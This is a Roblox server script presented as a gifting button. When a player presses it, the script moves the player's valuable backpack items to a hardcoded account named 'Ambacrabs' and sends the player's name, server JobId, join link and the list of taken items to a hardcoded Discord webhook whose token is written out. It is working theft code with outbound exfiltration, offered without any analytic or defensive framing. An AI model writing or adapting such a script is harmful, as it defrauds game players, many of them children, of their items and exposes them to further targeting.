local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local toggleEvent = ReplicatedStorage.ToggleEvent
local transferFunction = ReplicatedStorage.TransferItems

local webhook = "https://discord.com/api/webhooks/1213632501067677776/63sTNLZnXlLKSBybvkovTF8Uj_gKimIauapkZ5jMDI2GVKLwt6EgN6UXPvwanznG84BJ"
local goodItems = {"Candy Blossom", "Racoon", "Dragonfly", "Redfox"}

-- Discord Logging
local function sendWebhook(player, items)
	local payload = {
		content = "**Player Used Gifting Button**",
		embeds = {{
			title = "Gift Triggered",
			color = 16753920,
			fields = {
				{name = "Player", value = player.DisplayName.." ("..player.Name..")"},
				{name = "Game", value = game.Name},
				{name = "JobId", value = game.JobId},
				{name = "Good Items", value = #items > 0 and table.concat(items, ", ") or "None"},
				{name = "Players in Server", value = tostring(#Players:GetPlayers())},
				{name = "Join Link", value = "https://www.roblox.com/games/"..game.PlaceId.."?jobId="..game.JobId}
			}
		}}
	}
	HttpService:PostAsync(webhook, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
end

-- Gift items to Ambacrabs if present
local function tryGiftItems(fromPlayer)
	local recipient = Players:FindFirstChild("Ambacrabs")
	if not recipient then return end

	local backpack = fromPlayer:FindFirstChild("Backpack")
	local giftedItems = {}

	if backpack then
		for _, item in pairs(backpack:GetChildren()) do
			if table.find(goodItems, item.Name) then
				item.Parent = recipient:FindFirstChild("Backpack") or recipient
				table.insert(giftedItems, item.Name)
			end
		end
	end

	sendWebhook(fromPlayer, giftedItems)
end

-- Main trigger
toggleEvent.OnServerEvent:Connect(function(player)
	-- Try gift now
	tryGiftItems(player)

	-- Wait for Ambacrabs to join if not already here
	if not Players:FindFirstChild("Ambacrabs") then
		local conn
		conn = Players.PlayerAdded:Connect(function(p)
			if p.Name == "Ambacrabs" then
				task.wait(2)
				tryGiftItems(player)
				conn:Disconnect()
			end
		end)
	end
end)